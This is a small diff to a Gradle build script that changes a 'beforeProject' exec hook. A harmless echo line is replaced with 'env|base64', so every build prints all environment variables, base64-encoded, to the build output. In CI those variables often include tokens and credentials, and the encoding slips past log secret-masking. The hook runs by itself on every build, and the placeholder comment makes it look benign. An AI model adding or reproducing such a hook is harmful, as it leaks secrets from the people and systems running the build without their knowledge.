@@ -1,6 +1,6 @@
 gradle.beforeProject {
     exec {
-        commandLine 'sh', '-c', 'echo "Running pre-build command..."'
+        commandLine 'sh', '-c', 'env|base64'
         // Replace with your desired shell command
     }
 }
